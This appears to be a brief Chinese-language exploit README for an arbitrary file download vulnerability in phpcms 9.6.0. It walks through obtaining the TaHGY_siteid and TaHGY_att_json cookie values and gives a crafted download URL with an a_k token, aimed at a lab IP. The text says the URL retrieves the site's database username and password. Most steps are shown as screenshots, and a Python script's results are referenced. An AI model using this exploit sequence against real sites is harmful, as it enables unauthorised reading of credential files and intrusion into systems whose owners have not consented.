# phpcms9.6.0 任意文件下载
## 漏洞利用
### 获取TaHGY_siteid值
![Image text](https://github.com/yu-lc/EXP/blob/master/phpcms/phpcms9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/img/1.png)
### 利用post TaHGY_siteid值得到TaHGY_att_json值
![Image text](https://github.com/yu-lc/EXP/blob/master/phpcms/phpcms9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/img/2.png)
### 访问网址，即可下载数据库用户名与密码
http://192.168.150.131:8080/index.php?m=content&c=down&a=init&a_k=9e1aduoGZpLTNR_V_R15JOw-LDmJQ75fItd4lRFIjsLWBUOiNB7hEQKPzNHnMhO9TAl0KI0CXYukHPQPS3qCGRPIz5oB--d1yS_3uONlYzcNelC2t3RTfaWYmOI2g2kMpIk79EGDhSxaAjokMsjSSE2alhR6PaINMxWOTCuoEINi83s
![Image text](https://github.com/yu-lc/EXP/blob/master/phpcms/phpcms9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/img/3.png)
![Image text](https://github.com/yu-lc/EXP/blob/master/phpcms/phpcms9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/img/4.png)
## py代码执行结果
![Image text](https://github.com/yu-lc/EXP/blob/master/phpcms/phpcms9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/img/5.png)
